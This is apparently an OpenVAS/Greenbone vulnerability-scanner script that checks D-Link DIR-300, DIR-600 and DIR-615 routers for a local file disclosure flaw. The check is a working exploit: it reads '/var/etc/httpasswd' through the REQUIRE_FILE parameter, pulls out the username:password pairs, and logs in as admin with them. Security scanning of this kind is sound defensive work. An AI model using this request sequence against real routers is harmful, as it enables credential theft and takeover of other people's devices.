###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink__show_info.php_64043.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103858");
  script_bugtraq_id(64043);
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability");


  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64043");
  script_xref(name:"URL", value:"http://www.dlink.com/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-12-16 14:34:55 +0100 (Mon, 16 Dec 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_dlink_dir_detect.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_mandatory_keys("host_is_dlink_dir");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
potentially sensitive information from local files on devices running
the vulnerable application. This may aid in further attacks.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to read '/var/etc/httpasswd'");
  script_tag(name:"insight", value:"The remote D-Link device fails to adequately validate user supplied input
to 'REQUIRE_FILE' in '__show_info.php'");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Multiple D-Link DIR series routers are prone to a local file-
disclosure vulnerability.  fails to adequately validate user-
supplied input.");
  script_tag(name:"affected", value:"D-Link DIR-615
D-Link DIR-300
DIR-600");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");


port = get_kb_item("dlink_dir_port");
if(!port)exit(0);

if(!get_port_state(port))exit(0);

url = '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 200" || "<center>" >!< buf)exit(99);

creds = eregmatch(pattern:'<center>.*([a-zA-Z0-9]+:[a-zA-Z0-9]+)[^a-zA-Z0-9]*</center>', string:buf);

lines = split(buf);
x = 0;

foreach line (lines) {

  x++;
  if("<center>" >< line) {

    for(i=x; i < max_index(lines); i++) {

      if("</center>" >< lines[i])break;
      user_pass = eregmatch(pattern:"([a-zA-Z0-9]+:[a-zA-Z0-9]+)", string:lines[i]);
      if(!isnull(user_pass[1])) {
        ul[p++] = chomp(user_pass[1]);
        continue;
      }

    }

  }
}

if(max_index(ul) < 1)exit(99);

url = '/tools_admin.php';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("LOGIN_USER" >!< buf)exit(0);

foreach p (ul) {

  u = split(p, sep:":", keep:FALSE);

  if(isnull(u[0]))continue;

  user = u[0];
  pass = u[1];

  url = '/login.php';
  login_data = 'ACTION_POST=LOGIN&LOGIN_USER=' + user  + '&LOGIN_PASSWD=' + pass;
  req = http_post(item:url, port:port, data:login_data);

  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
  if(buf !~ "HTTP/1.. 200")continue;

  url = '/tools_admin.php';
  req = http_get(item:url, port:port);
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("OPERATOR PASSWORD" >< buf && "ADMIN PASSWORD" >< buf) {

    url = "/logout.php";
    req = http_get(item:url, port:port);
    http_send_recv(port:port, data:req, bodyonly:FALSE); # clear ip based auth

    security_message(port:port);
    exit(0);
  }


}

exit(99);

